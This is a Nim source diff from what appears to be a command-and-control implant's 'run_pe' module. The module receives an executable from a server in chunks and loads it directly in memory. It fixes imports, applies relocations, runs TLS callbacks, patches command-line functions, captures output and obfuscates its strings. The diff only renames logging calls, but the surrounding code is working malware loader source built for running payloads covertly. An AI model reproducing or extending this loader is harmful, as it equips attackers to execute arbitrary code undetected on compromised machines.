@@ -135,7 +135,7 @@ proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} =
   self.union1.OriginalFirstThunk
 
 proc fixIAT*(modulePtr: PVOID; exeArgs: string): bool =
-  debug "[+] Fix Import Address Table"
+  debugLog "run_pe", "Fix Import Address Table"
   let importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT)
   if importsDir == nil:
     return false
@@ -154,7 +154,7 @@ proc fixIAT*(modulePtr: PVOID; exeArgs: string): bool =
     # Construct full command line: "program.exe args"
     commandStr = exeArgs
     exeArgsPassed = true
-    debug "[+] Will patch command line functions with args: " & commandStr
+    debugLog "run_pe", "Will patch command line functions with args: " & commandStr
     
     # Allocate persistent memory for wide string (UTF-16)
     # Use Windows API to convert and allocate
@@ -374,13 +374,13 @@ proc execTLSCallbacks*(baseAddress: PVOID; tlsDir: ptr IMAGE_DATA_DIRECTORY; ful
     try:
       callback(cast[HINSTANCE](baseAddress), DLL_PROCESS_ATTACH, nil)
     except:
-      debug "[-] TLS Callback failed"
+      debugLog "run_pe", "TLS Callback failed"
       discard
     tlsCallback = tlsCallback + 1
 
 proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): string =
   try:
-    debug "[DEBUG] runPE called with exeArgs: '" & exeArgs & "' (len: " & $exeArgs.len & ")"
+    debugLog "run_pe", "runPE called with exeArgs: '" & exeArgs & "' (len: " & $exeArgs.len & ")"
     
     if peBytes.len == 0:
       return obf("Error: PE bytes are empty")
@@ -391,7 +391,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     if ntHeader == nil:
       return obf("Error: File isn't a valid PE file")
     
-    debug "[+] Exe File Prefer Image Base"
+    debugLog "run_pe", "Exe File Prefer Image Base"
     debug "Size: " & $ntHeader.OptionalHeader.SizeOfImage
     
     let relocDir = getPeDir(shellcodePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC)
@@ -408,7 +408,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
       return obf("Error: Failed to allocate image base at preferred address and no relocations available")
     
     if pImageBase == nil and relocDir != nil:
-      debug "[+] Try to Allocate Memory for New Image Base"
+      debugLog "run_pe", "Try to Allocate Memory for New Image Base"
       pImageBase = cast[ptr BYTE](VirtualAlloc(
         nil,
         ntHeader.OptionalHeader.SizeOfImage,
@@ -427,7 +427,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     # Copy headers
     copymem(pImageBase, shellcodePtr, ntHeader.OptionalHeader.SizeOfHeaders)
     
-    debug "[+] Mapping Section ..."
+    debugLog "run_pe", "Mapping Section ..."
     # Map sections
     let sectionHeaderArr = cast[ptr IMAGE_SECTION_HEADER](cast[csize_t](ntHeader) + csize_t(sizeof(IMAGE_NT_HEADERS)))
     for i in 0..<cast[int](ntHeader.FileHeader.NumberOfSections):
@@ -444,15 +444,15 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     let tlsDir = getPeDir(pImageBase, IMAGE_DIRECTORY_ENTRY_TLS)
     if tlsDir != nil:
       if fullTls:
-        debug "[+] TLS Directory found, attempting to fully patch TLS"
+        debugLog "run_pe", "TLS Directory found, attempting to fully patch TLS"
         if not fullPatchTLS(pImageBase, ntHeader.OptionalHeader.SizeOfImage, pImageBase + ntHeader.OptionalHeader.AddressOfEntryPoint):
-          debug "[-] WARNING: Full TLS patch failed, falling back to running callbacks once"
+          debugLog "run_pe", "WARNING: Full TLS patch failed, falling back to running callbacks once"
           execTLSCallbacks(pImageBase, tlsDir, fullTls)
       else:
-        debug "[+] TLS Directory found, running callbacks once"
+        debugLog "run_pe", "TLS Directory found, running callbacks once"
         execTLSCallbacks(pImageBase, tlsDir, fullTls)
     else:
-      debug "[-] No TLS Directory found"
+      debugLog "run_pe", "No TLS Directory found"
     
     # Apply relocations if needed
     if pImageBase != preferAddr:
@@ -462,7 +462,7 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
       else:
         if not applyReloc(cast[ULONGLONG](cast[DWORD](pImageBase)), cast[ULONGLONG](cast[DWORD](preferAddr)), pImageBase, ntHeader.OptionalHeader.SizeOfImage):
           return obf("Error: Failed to apply relocations")
-      debug "[+] Relocation Fixed."
+      debugLog "run_pe", "Relocation Fixed."
     
     debug "Run Exe Module:"
     
@@ -475,9 +475,9 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     sa.lpSecurityDescriptor = nil
     
     if CreatePipe(addr stdoutRead, addr stdoutWrite, addr sa, 0) == 0:
-      debug "[-] Failed to create stdout pipe"
+      debugLog "run_pe", "Failed to create stdout pipe"
     if CreatePipe(addr stderrRead, addr stderrWrite, addr sa, 0) == 0:
-      debug "[-] Failed to create stderr pipe"
+      debugLog "run_pe", "Failed to create stderr pipe"
     
     # Save original handles
     let originalStdout = GetStdHandle(STD_OUTPUT_HANDLE)
@@ -531,11 +531,11 @@ proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): st
     CloseHandle(stdoutRead)
     CloseHandle(stderrRead)
     
-    debug "[DEBUG] RunPE complete"
+    debugLog "run_pe", "RunPE complete"
     
     # Free allocated memory
     if pImageBase != nil:
-      debug "[+] Freeing PE memory"
+      debugLog "run_pe", "Freeing PE memory"
       discard VirtualFree(pImageBase, 0, MEM_RELEASE)
     
     if capturedOutput.len > 0:
@@ -560,8 +560,8 @@ proc run_pe*(taskId: string, params: JsonNode): JsonNode =
     try:
       let args = to(params, RunPeArgs)
       
-      debug "[DEBUG] run_pe: Requesting PE file"
-      debug "[DEBUG] UUID for download: " & args.uuid
+      debugLog "run_pe", "run_pe: Requesting PE file"
+      debugLog "run_pe", "UUID for download: " & args.uuid
       
       # Check if using cached file
       if params.hasKey(obf("cached")):
@@ -593,7 +593,7 @@ proc processRunPeChunk*(taskId: string, params: JsonNode, chunkData: string,
     try:
       let args = to(params, RunPeArgs)
       
-      debug "[DEBUG] run_pe chunk " & $currentChunk & "/" & $totalChunks
+      debugLog "run_pe", "run_pe chunk " & $currentChunk & "/" & $totalChunks
       
       # Decode and append chunk
       let decodedChunk = decode(chunkData)
@@ -612,14 +612,14 @@ proc processRunPeChunk*(taskId: string, params: JsonNode, chunkData: string,
         }
       
       # All chunks received, execute PE
-      debug "[DEBUG] run_pe: All " & $totalChunks & " chunks received, total size: " & $fileData.len & " bytes"
+      debugLog "run_pe", "run_pe: All " & $totalChunks & " chunks received, total size: " & $fileData.len & " bytes"
       
       # Construct full command line: "program.exe args"
       var fullCommandLine = args.program_name
       if args.args.len > 0:
         fullCommandLine = fullCommandLine & " " & args.args
       
-      debug "[DEBUG] run_pe: Executing PE with command line: '" & fullCommandLine & "'"
+      debugLog "run_pe", "run_pe: Executing PE with command line: '" & fullCommandLine & "'"
       
       let output = runPE(fileData, fullCommandLine, args.full_tls)
       
